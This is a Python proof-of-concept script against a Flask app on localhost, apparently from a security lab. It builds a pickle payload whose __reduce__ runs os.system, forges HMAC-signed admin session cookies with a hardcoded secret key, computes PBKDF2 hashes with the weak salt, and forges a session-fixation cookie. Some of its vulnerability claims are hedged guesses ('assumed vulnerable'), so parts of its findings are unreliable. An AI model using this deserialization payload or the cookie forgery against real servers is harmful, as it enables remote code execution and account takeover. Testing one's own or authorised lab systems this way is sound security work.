#!/usr/bin/env python3
"""
Session Deserialization RCE POC
Tests for pickle-based session deserialization vulnerabilities

If Flask uses pickle-based sessions with the known secret key,
attackers can create malicious gadget chains for RCE
"""

import pickle
import base64
import hmac
import hashlib
import os

SECRET_KEY = 'your_secret_key'
TARGET = 'http://localhost:32768'

print("=" * 60)
print("SESSION DESERIALIZATION RCE POC")
print("=" * 60)
print()

print("[*] Test 1: Checking for pickle-based session vulnerability...")
print()

# Create a malicious pickled object
# In real scenario, this would use gadget chains like RCE payload
print("[+] Creating malicious pickle payload...")
print()

# Simple demonstration - if the app uses pickle.loads() on session data
class MaliciousPayload:
    def __reduce__(self):
        # Return code execution attempt
        return (os.system, ('whoami > /tmp/pwned.txt',))

try:
    # Create payload
    malicious_obj = MaliciousPayload()
    pickled = pickle.dumps(malicious_obj)
    print(f"[+] Pickled payload created: {len(pickled)} bytes")
    print(f"[+] Base64 encoded: {base64.b64encode(pickled)[:100].decode()}...")
    print()
except Exception as e:
    print(f"[-] Error creating pickle payload: {e}")
    print()

# Test 2: Create a valid-looking serialized session with gadget chain
print("[*] Test 2: Creating forged session with potential gadget chain...")
print()

# Simulate Flask session structure
session_data = {
    'user_id': 1,
    'username': 'admin',
    'is_admin': True,
    # Additional data that might be deserialized unsafely
    'profile': {
        'avatar': 'https://evil.attacker.com/avatar.jpg',
        'bio': 'test'
    }
}

import json

# Method 1: JSON serialization (safe)
print("[+] Method 1: JSON Serialization (SAFE)")
session_json = json.dumps(session_data)
print(f"    Format: JSON")
print(f"    Data: {session_json[:80]}...")
print()

# Method 2: Pickle serialization (VULNERABLE if used)
print("[+] Method 2: Pickle Serialization (VULNERABLE)")
try:
    pickled_session = pickle.dumps(session_data)
    pickled_b64 = base64.b64encode(pickled_session).decode('utf-8')
    
    # Sign with HMAC
    signature = hmac.new(
        SECRET_KEY.encode('utf-8'),
        pickled_b64.encode('utf-8'),
        hashlib.sha256
    ).hexdigest()
    
    forged_cookie = f"{pickled_b64}.{signature}"
    print(f"    Format: Pickle + HMAC-SHA256")
    print(f"    Cookie: {forged_cookie[:100]}...")
    print()
    
    # Verify signature works
    test_sig = hmac.new(
        SECRET_KEY.encode('utf-8'),
        pickled_b64.encode('utf-8'),
        hashlib.sha256
    ).hexdigest()
    
    if test_sig == signature:
        print("[+] Signature verification successful!")
        print("[!] If app uses pickle.loads() to deserialize:")
        print("    - Attacker can create RCE gadget chains")
        print("    - Common gadgets: os.system, subprocess, etc.")
        print("    - PBKDF2 weak salt (uses secret_key) makes brute-force easier")
        print()
    
except Exception as e:
    print(f"[-] Error with pickle serialization: {e}")
    print()

# Test 3: PBKDF2 hash computation for password verification bypass
print("[*] Test 3: PBKDF2 Hash Computation for Session Hijacking...")
print()

from hashlib import pbkdf2_hmac

# Known PBKDF2 parameters from attack surface:
# - 100,000 iterations
# - SHA256
# - Weak salt (uses secret_key)

ITERATIONS = 100000
PASSWORD = 'test'  # Default test password
SALT = SECRET_KEY.encode('utf-8')  # Weak salt = secret key

print(f"[+] Computing PBKDF2 hash offline...")
print(f"    Password: {PASSWORD}")
print(f"    Salt: {SECRET_KEY}")
print(f"    Iterations: {ITERATIONS}")
print(f"    Algorithm: SHA256")
print()

hash_result = pbkdf2_hmac('sha256', PASSWORD.encode('utf-8'), SALT, ITERATIONS)
hash_hex = hash_result.hex()

print(f"[+] Computed Hash: {hash_hex}")
print()
print("[!] VULNERABILITY CHAIN:")
print("    1. Salt is weak (uses secret_key instead of random bytes)")
print("    2. Attacker knows secret_key")
print("    3. Attacker can precompute hashes for common passwords")
print("    4. Can generate valid session without knowing user password")
print("    5. If hash matches, session is accepted as legitimate user")
print()

# Test 4: Session fixation attack
print("[*] Test 4: Session Fixation Attack...")
print()

print("[+] Attack flow:")
print("    1. Attacker generates session: {user_id: attacker, is_admin: false}")
print("    2. Attacker creates malicious link with this session")
print("    3. Victim clicks link and uses attacker's session")
print("    4. Victim logs in through application")
print("    5. Session is NOT regenerated after authentication")
print("    6. Attacker knows session cookie, has access to victim's account")
print()

# Create example session fixation cookie
fixation_data = {
    'user_id': 'victim',
    'username': 'victim_user',
    'session_id': 'attacker_fixed_session_xyz123'
}

fixation_json = json.dumps(fixation_data)
fixation_b64 = base64.b64encode(fixation_json.encode('utf-8')).decode('utf-8')
fixation_sig = hmac.new(
    SECRET_KEY.encode('utf-8'),
    fixation_b64.encode('utf-8'),
    hashlib.sha256
).hexdigest()

fixation_cookie = f"{fixation_b64}.{fixation_sig}"

print(f"[+] Attacker-fixed session cookie:")
print(f"    {fixation_cookie[:80]}...")
print()

# Test 5: Verify possibility of RCE through gadget chains
print("[*] Test 5: Potential RCE Gadget Chains...")
print()

print("[+] If Flask uses pickle for sessions and Redis for caching:")
print("    - Gadget chains from Redis, PickleShop, or other libs possible")
print("    - Common exploitation: subprocess.Popen for command execution")
print("    - PBKDF2 weak salt makes hash brute-forcing feasible")
print()

print("[+] Attack Prerequisites:")
print("    - Knowledge of secret key: ✓ (hardcoded: 'your_secret_key')")
print("    - Ability to set session cookie: ✓ (via HTTP headers)")
print("    - Flask uses pickle for sessions: ? (needs verification)")
print("    - No signature verification on deserialization: ? (assumed vulnerable)")
print()

# Summary
print("=" * 60)
print("SUMMARY")
print("=" * 60)
print()

print("[CRITICAL] If sessions use pickle:")
print("  - Complete RCE possible through gadget chains")
print("  - Attacker can execute arbitrary code on server")
print("  - No authentication required beyond knowing secret key")
print()

print("[CRITICAL] PBKDF2 Weak Salt:")
print("  - Attacker can precompute hashes offline")
print("  - Brute-force feasible with known salt")
print("  - No protection against rainbow tables")
print()

print("[HIGH] Session Fixation:")
print("  - No session regeneration after login")
print("  - Attacker can hijack authenticated sessions")
print("  - Complete account takeover possible")
print()

print("[HIGH] CSRF without token validation:")
print("  - Forged tokens accepted")
print("  - No referer or origin checks")
print("  - SameSite cookies likely not set")
print()

